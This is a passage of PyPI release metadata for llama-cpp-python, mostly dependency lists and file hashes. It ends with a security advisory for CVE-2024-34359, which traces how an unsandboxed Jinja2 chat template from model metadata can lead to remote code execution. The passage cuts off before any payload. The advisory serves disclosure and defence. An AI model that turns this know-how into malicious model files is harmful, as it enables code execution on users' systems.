\"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.23","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"9b30fb7cd2d9a395d64f39b25eb36ba86163fd5bbb3c1427b9f2381b7d798d3a","md5":"5d3c4ed1d126d032c4ead6f5867470c2","sha256":"364b61a13970932ea189b45a1c5dea89797b90e5da00f1fe6e72c47fbc512898"},"downloads":-1,"filename":"llama_cpp_python-0.2.23.tar.gz","has_sig":false,"md5_digest":"5d3c4ed1d126d032c4ead6f5867470c2","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":8760700,"upload_time":"2023-12-14T02:55:46","upload_time_iso_8601":"2023-12-14T02:55:46.846032Z","url":"https://files.pythonhosted.org/packages/9b/30/fb7cd2d9a395d64f39b25eb36ba86163fd5bbb3c1427b9f2381b7d798d3a/llama_cpp_python-0.2.23.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.24":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.24/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.24","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"fefd498415767be24e802135c409922c0072947adc5d73ea85ce6c98c42f2e63","md5":"ae2d96475a414d362e0b3c86ed57d399","sha256":"85f8fd110b4b90599d5ff427bd4a1a4db6e70817c60ba8aa609fa5c645761ec1"},"downloads":-1,"filename":"llama_cpp_python-0.2.24.tar.gz","has_sig":false,"md5_digest":"ae2d96475a414d362e0b3c86ed57d399","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":8777118,"upload_time":"2023-12-18T21:11:12","upload_time_iso_8601":"2023-12-18T21:11:12.831770Z","url":"https://files.pythonhosted.org/packages/fe/fd/498415767be24e802135c409922c0072947adc5d73ea85ce6c98c42f2e63/llama_cpp_python-0.2.24.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.25":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.25/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.25","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"f73fe21c6af55661e7499133245ab622871e375b716af5a96d83770f2ad6d602","md5":"0ff5c4b47d2757895bf563412a56c07c","sha256":"ad47e491fcd4a27efe0c0d86b089bc57fdcce70b90053f0bed57183452e67ab6"},"downloads":-1,"filename":"llama_cpp_python-0.2.25.tar.gz","has_sig":false,"md5_digest":"0ff5c4b47d2757895bf563412a56c07c","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":8795980,"upload_time":"2023-12-22T20:23:45","upload_time_iso_8601":"2023-12-22T20:23:45.808373Z","url":"https://files.pythonhosted.org/packages/f7/3f/e21c6af55661e7499133245ab622871e375b716af5a96d83770f2ad6d602/llama_cpp_python-0.2.25.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.26":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.26/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.26","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"ce6416a6bbae31c24d07d1ef6f488b81d13e0eb009147f583d9047371216b7a0","md5":"08ecab8bfe1aecb06aceb13a86d6f059","sha256":"b808f3346c3c602096dc567b5a1c03540f4ad213498878bf72496e01a81af40b"},"downloads":-1,"filename":"llama_cpp_python-0.2.26.tar.gz","has_sig":false,"md5_digest":"08ecab8bfe1aecb06aceb13a86d6f059","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":8807192,"upload_time":"2023-12-27T22:37:14","upload_time_iso_8601":"2023-12-27T22:37:14.844266Z","url":"https://files.pythonhosted.org/packages/ce/64/16a6bbae31c24d07d1ef6f488b81d13e0eb009147f583d9047371216b7a0/llama_cpp_python-0.2.26.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.27":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.27/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.27","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"a983e3b7405f36b2f3dd4ae76c32e9331232c5692078deda7f84c1f0ede071ab","md5":"bd07d09131b272aef2cdf8a0d34f3869","sha256":"4f7228c38d0618ec80a76130ab4720693ea09efd5cd46920e075cadf00e6d060"},"downloads":-1,"filename":"llama_cpp_python-0.2.27.tar.gz","has_sig":false,"md5_digest":"bd07d09131b272aef2cdf8a0d34f3869","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":9353178,"upload_time":"2024-01-04T23:31:54","upload_time_iso_8601":"2024-01-04T23:31:54.951283Z","url":"https://files.pythonhosted.org/packages/a9/83/e3b7405f36b2f3dd4ae76c32e9331232c5692078deda7f84c1f0ede071ab/llama_cpp_python-0.2.27.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.28":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.28/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.28","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"1b7cebe6be46264fad03bf3490fdd48d03608c5e5f10656ffc0155f23b7872a9","md5":"3e974d32a584488c06790d9c6ba4a234","sha256":"669885d9654fe27ed084061e23b0c2af5fcf5593aa3d5a159864e249f91e6d84"},"downloads":-1,"filename":"llama_cpp_python-0.2.28.tar.gz","has_sig":false,"md5_digest":"3e974d32a584488c06790d9c6ba4a234","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":9401680,"upload_time":"2024-01-10T07:57:19","upload_time_iso_8601":"2024-01-10T07:57:19.115022Z","url":"https://files.pythonhosted.org/packages/1b/7c/ebe6be46264fad03bf3490fdd48d03608c5e5f10656ffc0155f23b7872a9/llama_cpp_python-0.2.28.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.29":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.29/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.29","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"12b691ec62d6b2b9648f013d77350446e0351b5685bd89129f188dae60157032","md5":"c583cb82e2d3ff95cab15d790c3d574e","sha256":"95d6eeba61f1a65beee57377d1e3bd451f0b7bcc76e2e5ec836014b278be1658"},"downloads":-1,"filename":"llama_cpp_python-0.2.29.tar.gz","has_sig":false,"md5_digest":"c583cb82e2d3ff95cab15d790c3d574e","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":9473998,"upload_time":"2024-01-15T17:57:31","upload_time_iso_8601":"2024-01-15T17:57:31.139478Z","url":"https://files.pythonhosted.org/packages/12/b6/91ec62d6b2b9648f013d77350446e0351b5685bd89129f188dae60157032/llama_cpp_python-0.2.29.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.3":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.3/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.3","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"99e619d9c978dc634d91b05416c8fc502171af6b27a20683669048afa5738b74","md5":"2c776d53cb20d7168da4bd069a61e787","sha256":"929e73527eafa75ca35464b58a092cc2a53630301b19763c76112b201bfa9b05"},"downloads":-1,"filename":"llama_cpp_python-0.2.3.tar.gz","has_sig":false,"md5_digest":"2c776d53cb20d7168da4bd069a61e787","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":1545246,"upload_time":"2023-09-13T22:09:45","upload_time_iso_8601":"2023-09-13T22:09:45.627942Z","url":"https://files.pythonhosted.org/packages/99/e6/19d9c978dc634d91b05416c8fc502171af6b27a20683669048afa5738b74/llama_cpp_python-0.2.3.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.30":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.30/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.30","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"04fb13c99d504497ab63833600f8ae2196e28c04ad2a1cb43987cc9b51dc0a56","md5":"4046fb907db1b06d2b96b94136137927","sha256":"0bf28528945bede4a1f7f913bdd8a0dd83204fc4d61ef52dfc5355abb7169857"},"downloads":-1,"filename":"llama_cpp_python-0.2.30.tar.gz","has_sig":false,"md5_digest":"4046fb907db1b06d2b96b94136137927","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":9722926,"upload_time":"2024-01-19T02:32:27","upload_time_iso_8601":"2024-01-19T02:32:27.043544Z","url":"https://files.pythonhosted.org/packages/04/fb/13c99d504497ab63833600f8ae2196e28c04ad2a1cb43987cc9b51dc0a56/llama_cpp_python-0.2.30.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n         